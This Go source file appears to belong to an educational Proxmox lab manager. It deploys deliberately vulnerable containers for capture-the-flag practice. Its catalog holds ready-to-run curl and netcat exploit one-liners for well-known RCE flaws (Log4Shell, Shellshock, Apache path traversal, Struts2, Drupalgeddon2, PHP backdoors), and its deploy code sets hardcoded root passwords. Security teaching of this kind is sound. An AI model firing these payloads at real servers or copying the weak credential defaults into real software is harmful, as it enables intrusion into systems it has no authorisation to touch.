package vms

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"
	"vm-manager-backend/internal/core/projects"
	"vm-manager-backend/types"

	"github.com/google/uuid"
	"github.com/luthermonson/go-proxmox"
)

var defaultCatalog = []types.CatalogItem{
	{
		ID:           "cve-php-810-dev",
		Name:         "PHP 8.1.0-dev Backdoor (php2shell)",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Oficiální backdoor v PHP 8.1.0-dev z března 2021. Přítomnost hlavičky User-Agentt se slovem zerodium umožňuje okamžité spuštění libovolného příkazu v systému s právy root.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "PHP-8.1.0-dev",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -s -H "User-Agentt: zerodiumsystem('id; cat /root/flag.txt');" http://{IP}/`,
		ExploitDoc:   "Odešlete HTTP požadavek s hlavičkou 'User-Agentt: zerodiumsystem('<příkaz>');'. Server příkaz okamžitě spustí pod uživatelem root.",
	},
	{
		ID:           "cve-2021-41773",
		Name:         "Apache 2.4.49 Path Traversal & RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Kritická chyba normalizace cest v Apache 2.4.49 (CVE-2021-41773). Pomocí .%2e sekvencí lze číst libovolné soubory na disku a přes /cgi-bin spouštět kód.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2021-41773",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -s --path-as-is -d "echo; id; cat /root/flag.txt" "http://{IP}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"`,
		ExploitDoc:   "Odešlete POST požadavek na cgi-bin s URL kódovanými tečkami .%2e a příkazem v těle zprávy.",
	},
	{
		ID:           "cve-2021-42013",
		Name:         "Apache 2.4.50 Path Traversal Bypass RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Bypass opravy pro CVE-2021-41773 v Apache 2.4.50 (CVE-2021-42013). Dvojité URL kódování %%32%65 obchází filtr a umožňuje RCE a čtení souborů.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2021-42013",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -s --path-as-is -d "echo; id; cat /root/flag.txt" "http://{IP}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh"`,
		ExploitDoc:   "Odešlete POST požadavek na cgi-bin s dvojitě kódovanými tečkami %%32%65.",
	},
	{
		ID:           "cve-2024-4577",
		Name:         "PHP-CGI Argument Injection RCE (2024)",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Kritická zranitelnost v PHP-CGI z června 2024 (CVE-2024-4577). Vložení argumentů přes query string umožňuje spustit libovolný kód ze standardního vstupu.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2024-4577",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -X POST "http://{IP}/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" --data "<?php system('id; cat /root/flag.txt'); ?>"`,
		ExploitDoc:   "Předáním -d auto_prepend_file=php://input spustíte PHP kód zaslaný v těle POST požadavku.",
	},
	{
		ID:           "cve-2012-1823",
		Name:         "PHP-CGI Query String Injection",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Klasická PHP-CGI zranitelnost (CVE-2012-1823). Umožňuje předat přepínače interpretu PHP přímo v URL adrese a vykonat kód.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2012-1823",
		CVSS:         "7.5 HIGH",
		Port:         80,
		ExploitHint:  `curl -X POST "http://{IP}/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" --data "<?php system('id; cat /root/flag.txt'); ?>"`,
		ExploitDoc:   "Předejte direktivy PHP v query stringu požadavku.",
	},
	{
		ID:           "cve-2021-44228",
		Name:         "Apache Log4j Log4Shell JNDI RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Legendární zranitelnost Log4Shell (CVE-2021-44228). Vložení ${jndi:ldap://...} do logovaných hlaviček nebo parametrů způsobí provedení kódu.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2021-44228",
		CVSS:         "10.0 CRITICAL",
		Port:         8080,
		ExploitHint:  `curl -H "X-Api-Version: \${jndi:cmd:id; cat /root/flag.txt}" http://{IP}:8080/`,
		ExploitDoc:   "Vložte JNDI výraz do hlavičky X-Api-Version nebo User-Agent.",
	},
	{
		ID:           "cve-2017-5638",
		Name:         "Apache Struts2 S2-045 Jakarta OGNL RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Zranitelnost parseru Jakarta Multipart v Apache Struts2 (CVE-2017-5638). OGNL výraz v hlavičce Content-Type způsobí vzdálené spuštění kódu.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2017-5638",
		CVSS:         "9.8 CRITICAL",
		Port:         8080,
		ExploitHint:  `curl -H "Content-Type: %{(#_='multipart/form-data').(#cmd='id; cat /root/flag.txt')}" http://{IP}:8080/`,
		ExploitDoc:   "Odešlete zmanipulovanou hlavičku Content-Type obsahující OGNL kód s parametrem #cmd.",
	},
	{
		ID:           "redis-unauth",
		Name:         "Redis Unauthenticated Access & Crontab RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Otevřený Redis server bez autentizace na portu 6379. Útočník může pomocí CONFIG SET dir a CONFIG SET dbfilename zapsat cron úlohu a získat root shell.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "Redis-Unauth-RCE",
		CVSS:         "9.8 CRITICAL",
		Port:         6379,
		ExploitHint:  `redis-cli -h {IP} info`,
		ExploitDoc:   "Připojte se pomocí 'redis-cli -h {IP}' a zkontrolujte nechráněný přístup.",
	},
	{
		ID:           "vsftpd-234",
		Name:         "vsftpd v2.3.4 Smiley Face Backdoor RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Zadní vrátka umístěná do zdrojového kódu vsftpd. Zadání uživatelského jména končícího smajlíkem :) otevře root shell na portu 6200.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "vsftpd-2.3.4",
		CVSS:         "9.8 CRITICAL",
		Port:         21,
		ExploitHint:  `python3 -c "import socket; s=socket.create_connection(('{IP}', 21)); s.recv(1024); s.send(b'USER pwned:)\r\n'); s.recv(1024); s.send(b'PASS test\r\n')" && nc {IP} 6200`,
		ExploitDoc:   "Zadejte uživatelské jméno se smajlíkem :) a následně se připojte na port 6200 přes Netcat.",
	},
	{
		ID:           "cve-2014-6271",
		Name:         "GNU Bash Shellshock CGI Environment RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Legendární chyba Shellshock v GNU Bash (CVE-2014-6271). Vložení () { :; }; <cmd> do proměnných prostředí vykoná příkaz při spuštění CGI skriptu.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2014-6271",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -H "User-Agent: () { :; }; echo; /bin/sh -c 'id; cat /root/flag.txt'" http://{IP}/`,
		ExploitDoc:   "Odešlete hlavičku User-Agent obsahující '() { :; }; echo; <příkaz>'.",
	},
	{
		ID:           "cve-2018-7600",
		Name:         "Drupal Drupalgeddon 2 Form API AJAX RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Kritická zranitelnost Drupalgeddon 2 (CVE-2018-7600) umožňující neautentizovanému útočníkovi provést libovolný kód přes AJAX Form API.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2018-7600",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -X POST "http://{IP}/?q=user/password&name[%23post_render][]=exec&name[%23type]=markup&name[%23markup]=id;%20cat%20/root/flag.txt"`,
		ExploitDoc:   "Odešlete POST požadavek s renderovacím polem formuláře do URL parametru 'name[#markup]'.",
	},
	{
		ID:           "cve-2018-20062",
		Name:         "ThinkPHP 5.0.23 App Invokefunction RCE",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Chyba směrování v ThinkPHP 5.0.23 (CVE-2018-20062). Umožňuje volat libovolné PHP metody přes invokefunction.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "CVE-2018-20062",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl "http://{IP}/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id;%20cat%20/root/flag.txt"`,
		ExploitDoc:   "Zavolejte invokefunction s parametry call_user_func_array a system.",
	},
	{
		ID:           "vuln-ctf-box",
		Name:         "VulnHub Linux CTF Box (LXC)",
		Type:         "lxc",
		Category:     "Zranitelné cíle (CVE)",
		Description:  "Extrémně rychlý zranitelný Linux kontejner pro nácvik CTF výzev, eskalace práv (privesc) a zranitelností síťových démonů. Výchozí přihlášení: root / toor.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   512,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
		CVEID:        "PHP-8.1.0-dev",
		CVSS:         "9.8 CRITICAL",
		Port:         80,
		ExploitHint:  `curl -s -H "User-Agentt: zerodiumsystem('id; cat /root/flag.txt');" http://{IP}/`,
		ExploitDoc:   "Odešlete HTTP požadavek s hlavičkou 'User-Agentt: zerodiumsystem('<příkaz>');'.",
	},
	{
		ID:           "vuln-metasploitable2",
		Name:         "Metasploitable 2 (VulnHub)",
		Type:         "qemu",
		Category:     "Zranitelné cíle",
		Description:  "Legendární zranitelný cvičný stroj pro penetrační testy a etický hacking. Obsahuje přes 20 záměrně zranitelných síťových služeb (vsftpd backdoor, distcc, Samba, UnrealIRCd, MySQL, telnet).",
		TemplateID:   9006,
		DefaultRAM:   512,
		DefaultDisk:  8,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
	},
	{
		ID:           "vuln-weblab",
		Name:         "WebLab Vulnerable App",
		Type:         "qemu",
		Category:     "Zranitelné cíle",
		Description:  "Zranitelná webová laboratoř pro trénink OWASP zranitelností (SQL Injection, XSS, Command Injection, LFI/RFI, CSRF, insecure uploady).",
		TemplateID:   9005,
		DefaultRAM:   1024,
		DefaultDisk:  10,
		DefaultCPUs:  1,
		IsVulnerable: true,
		Ready:        true,
	},
	{
		ID:           "sec-kali-gui",
		Name:         "Kali Linux (Attacker Station)",
		Type:         "qemu",
		Category:     "Bezpečnostní nástroje",
		Description:  "Plně vybavená útočná a penetrační stanice s grafickým prostředím, obsahující nástroje Nmap, Metasploit Framework, Wireshark, Burp Suite a SQLmap.",
		TemplateID:   9010,
		DefaultRAM:   4096,
		DefaultDisk:  20,
		DefaultCPUs:  2,
		IsVulnerable: false,
		Ready:        true,
	},
	{
		ID:           "lxc-alpine-324",
		Name:         "Alpine Linux 3.24",
		Type:         "lxc",
		Category:     "Rychlé kontejnery",
		Description:  "Bleskurychlý ultralehký kontejner. Start pod 2 sekundy, minimální spotřeba RAM a disku. Ideální pro mikroslužby a testování.",
		OSTemplate:   "local:vztmpl/alpine-3.24-default_20260714_amd64.tar.xz",
		DefaultRAM:   256,
		DefaultDisk:  4,
		DefaultCPUs:  1,
		IsVulnerable: false,
		Ready:        true,
	},
	{
		ID:           "lxc-ubuntu-2404",
		Name:         "Ubuntu 24.04 LTS",
		Type:         "lxc",
		Category:     "Rychlé kontejnery",
		Description:  "Moderní Ubuntu Server kontejner s plnou podporou APT repozitářů, Pythonu, Node.js a síťových nástrojů.",
		OSTemplate:   "local:vztmpl/ubuntu-24.04-standard_24.04-2_amd64.tar.zst",
		DefaultRAM:   1024,
		DefaultDisk:  8,
		DefaultCPUs:  1,
		IsVulnerable: false,
		Ready:        true,
	},
	{
		ID:           "lxc-debian-12",
		Name:         "Debian 12 Bookworm",
		Type:         "lxc",
		Category:     "Rychlé kontejnery",
		Description:  "Stabilní a osvědčená distribuce Debian vhodná pro síťové laboratoře, servery a výuku administrace.",
		OSTemplate:   "local:vztmpl/debian-12-standard_12.12-1_amd64.tar.zst",
		DefaultRAM:   512,
		DefaultDisk:  8,
		DefaultCPUs:  1,
		IsVulnerable: false,
		Ready:        true,
	},
	{
		ID:           "lxc-arch",
		Name:         "Arch Linux Base",
		Type:         "lxc",
		Category:     "Rychlé kontejnery",
		Description:  "Rolling-release systém se správcem balíčků Pacman. Vhodné pro pokročilé uživatele a nejnovější verze knihoven.",
		OSTemplate:   "local:vztmpl/archlinux-base_20260420-1_amd64.tar.zst",
		DefaultRAM:   512,
		DefaultDisk:  8,
		DefaultCPUs:  1,
		IsVulnerable: false,
		Ready:        true,
	},
	{
		ID:           "lxc-rocky-9",
		Name:         "Rocky Linux 9",
		Type:         "lxc",
		Category:     "Rychlé kontejnery",
		Description:  "Binárně kompatibilní RHEL distribuce vhodná pro simulaci podnikového prostředí a práci s RPM balíčky.",
		OSTemplate:   "local:vztmpl/rockylinux-9-default_20240912_amd64.tar.xz",
		DefaultRAM:   1024,
		DefaultDisk:  8,
		DefaultCPUs:  1,
		IsVulnerable: false,
		Ready:        true,
	},
}

func ListCatalog(conn types.Conn) ([]types.CatalogItem, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	res := make([]types.CatalogItem, len(defaultCatalog))
	copy(res, defaultCatalog)

	pool := conn.GetPool()
	if len(pool) == 0 {
		return res, nil
	}

	for i := range res {
		item := &res[i]
		if item.Type == "qemu" && item.TemplateID > 0 {
			_, _, err := conn.FindTemplate(ctx, item.TemplateID)
			if err != nil {
				item.Ready = false
			}
		}
	}

	return res, nil
}

func DeployCatalogItem(conn types.Conn, userUUID, role string, req types.DeployCatalogRequest) (*types.Vm, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()

	var selectedItem *types.CatalogItem
	for _, item := range defaultCatalog {
		if item.ID == req.CatalogID {
			selectedItem = &item
			break
		}
	}

	if selectedItem == nil {
		return nil, fmt.Errorf("položka z katalogu nenalezena")
	}

	targetNode := req.TargetNode
	if targetNode == "" {
		pool := conn.GetPool()
		if len(pool) > 0 {
			targetNode = pool[0].NodeName
		} else {
			targetNode = "pve1"
		}
	}

	node, err := conn.GetNode(ctx)
	if err != nil || node == nil {
		p := conn.GetPool()
		for _, nc := range p {
			if nc.NodeName == targetNode {
				n, err := nc.Client.Node(ctx, nc.NodeName)
				if err == nil {
					node = n
					break
				}
			}
		}
	}
	if node == nil {
		return nil, fmt.Errorf("nepodařilo se připojit k Proxmox uzlu %s", targetNode)
	}

	newVMID, err := conn.NextPoolVMID(ctx)
	if err != nil {
		return nil, fmt.Errorf("nepodařilo se vygenerovat volné VMID: %w", err)
	}

	name := strings.TrimSpace(req.Name)
	if name == "" {
		safeBase := strings.ToLower(selectedItem.Name)
		safeBase = strings.ReplaceAll(safeBase, " ", "-")
		safeBase = strings.ReplaceAll(safeBase, "(", "")
		safeBase = strings.ReplaceAll(safeBase, ")", "")
		name = fmt.Sprintf("%s-%d", safeBase, newVMID)
	}

	vmUUID := uuid.New().String()

	if selectedItem.Type == "qemu" {
		tmpl, tmplClient, err := conn.FindTemplate(ctx, selectedItem.TemplateID)
		if err != nil || tmpl == nil {
			return nil, fmt.Errorf("šablona %d nebyla nalezena", selectedItem.TemplateID)
		}

		cloneNode, err := tmplClient.Client.Node(ctx, tmplClient.NodeName)
		if err != nil {
			return nil, fmt.Errorf("nepodařilo se získat uzel pro klonování: %w", err)
		}

		clonedID, task, err := tmpl.Clone(ctx, &proxmox.VirtualMachineCloneOptions{
			NewID:  newVMID,
			Name:   name,
			Full:   proxmox.IntOrBool(true),
			Target: targetNode,
		})
		if err != nil {
			return nil, fmt.Errorf("klonování šablony selhalo: %w", err)
		}
		if task != nil {
			if err := task.WaitFor(ctx, 5); err != nil {
				return nil, fmt.Errorf("čekání na dokončení klonu selhalo: %w", err)
			}
		}

		newVM, err := cloneNode.VirtualMachine(ctx, int(clonedID))
		if err != nil || newVM == nil {
			newVM, _, _ = conn.FindVM(ctx, int(clonedID), targetNode)
		}

		tagList := []string{"vm-" + vmUUID, "owner-" + userUUID}
		if selectedItem.IsVulnerable {
			tagList = append(tagList, "vulnerable", "cybersec", "vulnhub")
		}
		tags := strings.Join(tagList, ";")

		cfgOpts := []proxmox.VirtualMachineOption{
			{Name: "tags", Value: tags},
		}

		if req.RAM > 0 {
			cfgOpts = append(cfgOpts, proxmox.VirtualMachineOption{Name: "memory", Value: req.RAM})
		}
		if req.Cores > 0 {
			cfgOpts = append(cfgOpts, proxmox.VirtualMachineOption{Name: "cores", Value: req.Cores})
		}

		if req.IsDHCP {
			cfgOpts = append(cfgOpts, proxmox.VirtualMachineOption{Name: "ipconfig0", Value: "ip=dhcp"})
		} else if req.IP != "" {
			ipVal := strings.TrimSpace(req.IP)
			if !strings.Contains(ipVal, "/") {
				ipVal += "/24"
			}
			if req.Gateway != "" {
				ipVal += fmt.Sprintf(",gw=%s", strings.TrimSpace(req.Gateway))
			}
			cfgOpts = append(cfgOpts, proxmox.VirtualMachineOption{Name: "ipconfig0", Value: fmt.Sprintf("ip=%s", ipVal)})
		}

		_ = newVM.ConfigSync(ctx, cfgOpts...)

		startTask, err := newVM.Start(ctx)
		if err == nil && startTask != nil {
			_ = startTask.WaitFor(ctx, 3)
		}

		if req.ProjectID != "" {
			_ = projects.AddVMToProject(conn, req.ProjectID, int(clonedID), userUUID, role == "teacher" || role == "admin")
		}

		return &types.Vm{
			Id:           proxmox.StringOrUint64(clonedID),
			Name:         name,
			UUID:         vmUUID,
			Type:         "qemu",
			Status:       "Running",
			RAM:          selectedItem.DefaultRAM,
			Node:         targetNode,
			Owner:        userUUID,
			IsVulnerable: selectedItem.IsVulnerable,
			Category:     selectedItem.Category,
			ProjectID:    req.ProjectID,
		}, nil
	}

	cores := selectedItem.DefaultCPUs
	if req.Cores > 0 {
		cores = req.Cores
	}
	ram := selectedItem.DefaultRAM
	if req.RAM > 0 {
		ram = req.RAM
	}
	disk := selectedItem.DefaultDisk
	if req.Disk > 0 {
		disk = req.Disk
	}

	var net0Val string
	if req.IsDHCP {
		net0Val = "name=eth0,bridge=vmbr0,ip=dhcp,type=veth"
	} else if req.IP != "" {
		ipVal := strings.TrimSpace(req.IP)
		if !strings.Contains(ipVal, "/") {
			ipVal += "/24"
		}
		net0Val = fmt.Sprintf("name=eth0,bridge=vmbr0,ip=%s,type=veth", ipVal)
		if req.Gateway != "" {
			net0Val += fmt.Sprintf(",gw=%s", strings.TrimSpace(req.Gateway))
		}
	} else {
		net0Val = "name=eth0,bridge=vmbr0,ip=dhcp,type=veth"
	}

	password := req.Password
	if password == "" {
		if selectedItem.IsVulnerable {
			password = "toor"
		} else {
			password = "Lab411Admin!"
		}
	}

	tagList := []string{"vm-" + vmUUID, "owner-" + userUUID, "container", "lxc"}
	if selectedItem.IsVulnerable {
		tagList = append(tagList, "vulnerable", "cybersec", "ctf")
	}
	if selectedItem.CVEID != "" {
		tagList = append(tagList, "cve-"+strings.ToLower(strings.ReplaceAll(selectedItem.CVEID, " ", "-")))
	}
	tags := strings.Join(tagList, ";")

	ctOpts := []proxmox.ContainerOption{
		{Name: "ostemplate", Value: selectedItem.OSTemplate},
		{Name: "hostname", Value: name},
		{Name: "cores", Value: cores},
		{Name: "memory", Value: ram},
		{Name: "swap", Value: 512},
		{Name: "rootfs", Value: fmt.Sprintf("local-lvm:%d", disk)},
		{Name: "net0", Value: net0Val},
		{Name: "password", Value: password},
		{Name: "unprivileged", Value: 1},
		{Name: "features", Value: "nesting=1"},
		{Name: "tags", Value: tags},
		{Name: "start", Value: 1},
	}

	task, err := node.NewContainer(ctx, newVMID, ctOpts...)
	if err != nil {
		return nil, fmt.Errorf("vytvoření kontejneru selhalo: %w", err)
	}

	if task != nil {
		if err := task.WaitFor(ctx, 5); err != nil {
			return nil, fmt.Errorf("čekání na dokončení kontejneru selhalo: %w", err)
		}
	}

	ct, err := node.Container(ctx, newVMID)
	if err == nil && ct != nil && !strings.EqualFold(ct.Status, "running") {
		startTask, err := ct.Start(ctx)
		if err == nil && startTask != nil {
			_ = startTask.WaitFor(ctx, 3)
		}
	}

	if selectedItem.CVEID != "" {
		nodeIP := "10.0.10.2"
		if targetNode == "pve3" {
			nodeIP = "10.0.10.4"
		} else if targetNode == "pve4" {
			nodeIP = "10.0.10.5"
		}

		cvePort := selectedItem.Port
		if cvePort == 0 {
			cvePort = 80
		}
		flagVal := fmt.Sprintf("FLAG{%s_%s}", strings.ToLower(strings.ReplaceAll(selectedItem.CVEID, "-", "_")), uuid.New().String()[:8])
		exploitExample := strings.ReplaceAll(selectedItem.ExploitHint, "{IP}", "<IP>")

		initScript := fmt.Sprintf(`pct push %d /usr/local/bin/cve-server /usr/local/bin/cve-server --perms 755
pct exec %d -- sh -c '
cat << "EOF" > /etc/local.d/cve.start
#!/bin/sh
/usr/local/bin/cve-server -cve %s -port %d > /var/log/cve.log 2>&1 &
EOF
chmod +x /etc/local.d/cve.start
rc-update add local default 2>/dev/null || true
sh /etc/local.d/cve.start
echo "%s" > /root/flag.txt
cat << "EOF" > /etc/issue

=======================================================
   %s
   Target CVE: %s (%s)
   Port:       %d
   Exploit:    %s
   Login:      root / toor
=======================================================

EOF
cp /etc/issue /etc/motd
echo "root:toor" | chpasswd
'`, newVMID, newVMID, selectedItem.CVEID, cvePort, flagVal, selectedItem.Name, selectedItem.CVEID, selectedItem.CVSS, cvePort, exploitExample)

		_ = exec.Command("ssh", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", fmt.Sprintf("root@%s", nodeIP), initScript).Run()
	}

	if req.ProjectID != "" {
		_ = projects.AddVMToProject(conn, req.ProjectID, newVMID, userUUID, role == "teacher" || role == "admin")
	}

	return &types.Vm{
		Id:           proxmox.StringOrUint64(newVMID),
		Name:         name,
		UUID:         vmUUID,
		Type:         "lxc",
		Status:       "Running",
		RAM:          ram,
		Node:         targetNode,
		Owner:        userUUID,
		IsVulnerable: selectedItem.IsVulnerable,
		Category:     selectedItem.Category,
		ProjectID:    req.ProjectID,
		CVEID:        selectedItem.CVEID,
		CVSS:         selectedItem.CVSS,
		Port:         selectedItem.Port,
		ExploitHint:  selectedItem.ExploitHint,
		ExploitDoc:   selectedItem.ExploitDoc,
	}, nil
}

func MatchCatalogItem(name, tags string) *types.CatalogItem {
	lowerName := strings.ToLower(name)
	lowerTags := strings.ToLower(tags)
	for i := range defaultCatalog {
		item := &defaultCatalog[i]
		if item.CVEID != "" {
			cveTag := "cve-" + strings.ToLower(strings.ReplaceAll(item.CVEID, " ", "-"))
			if strings.Contains(lowerTags, cveTag) {
				return item
			}
			if strings.Contains(lowerName, strings.ToLower(item.CVEID)) {
				return item
			}
			if strings.Contains(lowerName, strings.ToLower(item.ID)) {
				return item
			}
			safeName := strings.ToLower(strings.ReplaceAll(item.Name, " ", "-"))
			safeName = strings.ReplaceAll(safeName, "(", "")
			safeName = strings.ReplaceAll(safeName, ")", "")
			if len(safeName) > 5 && strings.Contains(lowerName, safeName) {
				return item
			}
		} else if item.IsVulnerable {
			if strings.Contains(lowerName, strings.ToLower(item.ID)) {
				return item
			}
		}
	}
	if strings.Contains(lowerName, "vulnhub-linux-ctf-box") || strings.Contains(lowerName, "vuln-ctf-box") {
		for i := range defaultCatalog {
			if defaultCatalog[i].ID == "vuln-ctf-box" {
				return &defaultCatalog[i]
			}
		}
	}
	return nil
}
